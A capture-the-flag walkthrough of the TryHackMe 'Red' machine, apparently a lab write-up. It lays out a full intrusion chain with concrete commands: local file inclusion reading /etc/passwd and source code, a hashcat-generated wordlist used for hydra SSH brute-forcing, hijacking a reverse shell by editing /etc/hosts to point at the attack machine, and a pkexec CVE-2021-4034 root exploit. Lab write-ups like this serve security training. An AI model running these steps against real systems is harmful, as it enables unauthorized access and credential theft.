## Service Enumeration
```
[+] Port 22
	Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 
	Public Exploits: None 

	  - I need to authenticate with either credential or certificate. 


[+] Port 80
	Version: Apache httpd 2.4.41 
	Public Exploits: None 

	- Visiting the webpage, noticed LFI vector
```
![](/images/THM/red/webpage.png)
```
	- Testing for LFI with file:// url schema
```
![](images/THM/red/file.png)
```
	- From the /etc/paswd file, discoverd 2 non-default user accounts 
		- blue
		- red 
		  
	- Viewing the source code with php wrappers 
```
![](images/THM/red/php.png)
```
	- Decode the response from base64
```
```php 
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}
?>
```
```
	- There is a filter in the source that strips '../' in other to prevent Directory Traversal. No issues, we found a greater power `LFI` 


	[+] Black Box Testing
		Without any Prior information about the inner functioning of this machine, we are going to test it 

		- Reading the history file of both users, I found some information in the blue's history. 
```
![](/images/THM/red/blue.png)
```
		- It seems the user `blue` ran some commands; one of which looks important to us
			
		- This command basically takes the pattern of text in the .reminder file and applies the hashcat base64.rule on it, in order to generate a list of passwords. 
			  
		- Reading the content of .reminder
```
![](/images/THM/red/reminder.png)
```
		- Create a file `.reminder` locally with `sup3r_p@s$w0rd!` as the content. 
			
		- Run the hashcat command that was found in the .bash_history file in order to generate a wordlist that can be used to bruteforce blue's ssh password.
			 > hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```


## Initial Access
```
[+] SSH Password Bruteforce
	Using the wordlist generated, we can perform a password bruteforce on the ssh service using blue as the username.
	
		> hydra -l blue -P passlist.txt <Target_url> ssh -t 30 
		
	- Guess the password and successfully authenticate. 
```


## Post Exploitation
```
[+] Lateral Movement
	We currently logged in as blue, we need to find a way to also gain access to red
	
	[+] Pspy
		Running pspy shows that the user `red` regularly runs a command that sends a reverse shell to a particular url. 
```
![](/images/THM/red/pspy.png)
```
		- Running dig on this url shows the ip address 
			> dig redrules.thm 
```
![](/images/THM/red/dig.png)
```
		- Checking the /etc/hosts file also reveals that the url is locally resolved 
			> cat /etc/hosts 
```
![](/images/THM/red/hosts.png)
```
		- Checking the permissions of the /etc/hosts file, we have write permissions :) 
			> ls -la /etc/hosts
		
		- We can write our attack machine's ip to the /etc/hosts file and map it to the `redrules.thm` url
			> echo "<attack_ip> redrules.thm" >> /etc/hosts 
		
		- Run your nc listener on port 9001 
			  > nc -lvnp 9001
		
		- After a minute, you should get a shell as red :_: 


[+] Vertical Movement
	Time to Escalate privileges to the root user

	[+] SUID on pkexec 
		There is a .git folder in red's home directory which has a pkexec binary with SUID set on it.
	
		- Researching online for exploits; found a python exploits. (link at the end of this post)
		
		- Modify the script to locate the correct path of the psexec binary
		  
			libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)		
```
![](/images/THM/red/psexec.png)
```	
		- Upload the exploit to the target machine 
		  
		- Running the script should give you a root shell
			> python3 CVE-2021-4034.py 
```
